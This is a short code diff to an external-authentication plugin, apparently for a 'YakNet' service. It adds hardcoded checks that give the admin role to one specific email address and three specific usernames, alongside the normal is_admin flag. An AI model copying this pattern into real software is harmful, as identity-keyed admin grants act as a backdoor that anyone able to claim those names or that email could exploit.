@@ -187,7 +187,15 @@ async function register({ registerExternalAuth, registerSetting, settingsManager
 
       const displayName = rawUser.name || rawUser.username || username;
       const email = rawUser.email;
-      const role = rawUser.is_admin === 1 || rawUser.is_admin === true ? 0 : 2;
+      const role =
+        rawUser.is_admin === 1 ||
+        rawUser.is_admin === true ||
+        email === 'yakistir98@gmail.com' ||
+        username === 'enesyakistir' ||
+        username === 'yaknet' ||
+        username === 'yaktube'
+          ? 0
+          : 2;
 
       logger.info(`YakNet Authenticated user: ${username} (${email})`);
 
